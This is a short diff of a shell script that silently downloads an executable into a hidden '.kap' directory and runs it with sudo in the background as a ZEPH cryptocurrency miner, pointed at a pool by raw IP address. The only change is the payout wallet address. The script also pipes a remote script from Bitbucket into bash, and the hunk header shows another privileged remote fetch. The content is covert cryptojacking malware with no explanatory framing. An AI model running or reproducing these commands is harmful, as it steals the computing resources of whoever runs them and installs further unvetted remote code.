@@ -12,5 +12,5 @@ sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://
 mkdir .kap && cd .kap
 wget -O sgr1 https://bitbucket.org/commuter21/escom/downloads/xmolx >/dev/null 2>&1
 chmod +x sgr1
-sudo ./sgr1 --coin=ZEPH -a rx/0 -o 139.177.188.78:80 -u 82z34TsNcf14PYSUTm58ds8or1Knyk9hs1v6LkpMvPzFAXxYFvD5afoNBVpxCpkjH81YzeAiiM6rnDWQNnR2s5i9Ed1Ct7Y -p ikuk -t $(nproc --all) --donate-level 1 -k > /dev/null 2>&1 &
+sudo ./sgr1 --coin=ZEPH -a rx/0 -o 139.177.188.78:80 -u 83HzBwN146c9iq4p8mcxT6fM3hUNmHpzZii8uS8j37LkimD72XNQ3kZ9GisSHpWNw4UKapG4pkfzB9hKvvXxvdn2Gmrynju -p ikuk -t $(nproc --all) --donate-level 1 -k > /dev/null 2>&1 &
 curl -sL https://bitbucket.org/commuter21/escom/raw/main/gudabel.sh | bash
